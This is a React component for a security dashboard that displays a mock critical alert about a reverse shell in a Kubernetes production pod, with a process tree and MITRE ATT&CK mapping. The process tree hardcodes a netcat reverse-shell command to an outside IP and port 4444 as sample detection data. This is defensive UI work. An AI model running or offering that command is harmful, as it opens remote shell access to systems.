import React from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { ShieldAlert, Crosshair, BrainCircuit } from 'lucide-react';
import { Button } from '@/components/ui/button';

export default function BehaviorAnalyticsDashboard() {
  return (
    <div className="p-8 space-y-6 bg-slate-950 min-h-screen text-slate-100 font-sans border-t border-slate-800">
        
        <div className="flex justify-between items-center border-b border-slate-800 pb-4 mb-6">
            <div>
                <div className="flex items-center gap-2 mb-2">
                    <span className="text-[10px] font-black tracking-widest px-2 py-0.5 rounded border border-rose-900/50 bg-rose-950/30 text-rose-400">CRITICAL ANOMALY</span>
                </div>
                <h2 className="text-2xl font-bold flex items-center gap-2 text-slate-200">
                    <BrainCircuit className="text-rose-400" />
                    Behavior Deviation: Interactive Reverse Shell
                </h2>
                <p className="text-slate-400 mt-1">Workload: <span className="font-mono text-indigo-400">prod-api-pod-8b4d</span> (K8s Namespace: production)</p>
            </div>
            <Button className="bg-rose-600 hover:bg-rose-700 text-white gap-2">
                <Crosshair size={16} /> Isolate Workload (Kill Pod)
            </Button>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            <div className="lg:col-span-2 space-y-6">
                
                <Card className="bg-slate-900 border-slate-800">
                    <CardContent className="p-6">
                        <h3 className="text-lg font-bold text-slate-200 mb-4 border-b border-slate-800 pb-2">AI Behavior Analysis</h3>
                        <p className="text-slate-400 text-sm leading-relaxed mb-6">
                            The Behavioral Analytics Engine has detected a severe deviation from established runtime baselines for this container. A web-facing Nginx worker process spawned a shell (`/bin/sh`) which immediately initiated an outbound TCP connection to an unknown external IP address over port 4444. This strongly indicates a successful Remote Code Execution (RCE) exploit resulting in a reverse shell.
                        </p>
                        
                        <div className="bg-slate-950 p-4 rounded border border-slate-800 font-mono text-xs text-slate-300">
                            <div className="text-slate-500 mb-2"># Observed Process Tree Deviation</div>
                            <div>containerd-shim</div>
                            <div className="pl-4">└── nginx -g daemon off; (PID: 1) <span className="text-emerald-400 font-bold ml-2">[BASELINE]</span></div>
                            <div className="pl-8 text-rose-400 font-bold">└── /bin/sh -c "nc -e /bin/sh 185.12.3.4 4444" (PID: 45) [ANOMALY]</div>
                            <div className="pl-12 text-rose-400 font-bold">└── nc -e /bin/sh 185.12.3.4 4444 (PID: 46) [ANOMALY]</div>
                        </div>
                    </CardContent>
                </Card>

            </div>

            <div className="space-y-6">
                <Card className="bg-slate-900 border-slate-800">
                    <CardContent className="p-6">
                        <h3 className="text-sm font-bold text-slate-400 uppercase tracking-widest mb-4">MITRE ATT&CK Mapping</h3>
                        <div className="space-y-3">
                            <MitreTactic tactic="Execution" technique="T1059.004 (Unix Shell)" />
                            <MitreTactic tactic="Command and Control" technique="T1090 (Connection Proxy)" />
                        </div>
                    </CardContent>
                </Card>
            </div>

        </div>
    </div>
  );
}

function MitreTactic({ tactic, technique }: any) {
    return (
        <div className="flex items-start gap-2 bg-slate-950 p-2 rounded border border-rose-900/30">
            <ShieldAlert size={14} className="text-rose-400 mt-0.5 shrink-0" />
            <div>
                <div className="text-xs font-bold text-slate-200">{tactic}</div>
                <div className="text-[10px] text-slate-500">{technique}</div>
            </div>
        </div>
    );
}
